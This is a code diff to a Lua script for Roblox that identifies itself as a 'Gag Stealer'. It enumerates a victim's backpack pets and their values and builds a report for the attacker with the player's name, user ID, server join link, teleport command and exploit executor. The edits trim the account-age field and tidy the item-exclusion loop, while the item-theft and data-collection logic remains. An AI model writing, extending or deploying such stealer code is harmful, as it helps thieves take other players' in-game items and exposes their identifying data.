@@ -322,15 +322,6 @@
         local dateStr = os.date("%m/%d/%y")
         local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
         local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)
-        
-        -- Calculate account age
-        local accountAge = "Unknown"
-        local success, result = pcall(function()
-            return tostring(plr.AccountAge) .. " days"
-        end)
-        if success then
-            accountAge = result
-        end
 
         -- Pet list formatting
         local petLines = {}
@@ -347,14 +338,13 @@
 
         -- Main embed description
         local description = string.format(
-            "X Scripts Gag Stealer\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nAccount Age: %s\nPlayers in game: %s/%s\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
+            "X Scripts Gag Stealer\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nPlayers in game: %s/%s\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
             totalValueStr,
             petListStr,
             joinUrl,
             teleportCmd,
             playerName,
             userId,
-            accountAge,
             playerCount,
             maxPlayers,
             executor,
@@ -441,16 +431,7 @@
     local itemCount = 0
 
     for _, tool in ipairs(backpack:GetChildren()) do
-        local isExcluded = false
-        for _, excluded in ipairs(excludedItems) do
-            if tool.Name == excluded then
-                isExcluded = true
-                break
-            end
-        end
-        
-        if tool:IsA("Tool") and not isExcluded then
-            itemCount = itemCount + 1
+        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
             if tool:GetAttribute("ItemType") == "Pet" then
                 local petUUID = tool:GetAttribute("PET_UUID")
                 if petUUID and dataService and dataService.GetData then
